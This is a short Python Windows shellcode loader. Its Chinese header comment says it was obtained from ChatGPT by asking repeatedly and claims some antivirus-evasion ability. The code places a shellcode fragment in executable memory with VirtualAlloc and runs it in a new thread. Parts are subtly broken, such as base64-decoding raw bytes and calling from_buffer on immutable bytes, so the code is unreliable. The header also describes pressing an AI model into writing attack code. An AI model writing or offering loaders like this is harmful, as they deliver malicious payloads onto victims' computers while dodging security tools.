# 多次提问chatgpt给出的Python编写的shellcode加载器的示例代码，也有一定绕过能力，区别是未对shellcode加密混淆，仅供参考

import ctypes
import base64

shellcode = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b"

# 将base64编码的shellcode解码为二进制
shellcode = base64.b64decode(shellcode)

# 分配内存并将shellcode写入该内存
shellcode_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                    ctypes.c_int(len(shellcode)),
                                                    ctypes.c_int(0x3000),
                                                    ctypes.c_int(0x40))
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(shellcode_ptr), ctypes.c_int(len(shellcode)))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(shellcode_ptr), buf, ctypes.c_int(len(shellcode)))

# 创建线程来执行shellcode
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(shellcode_ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
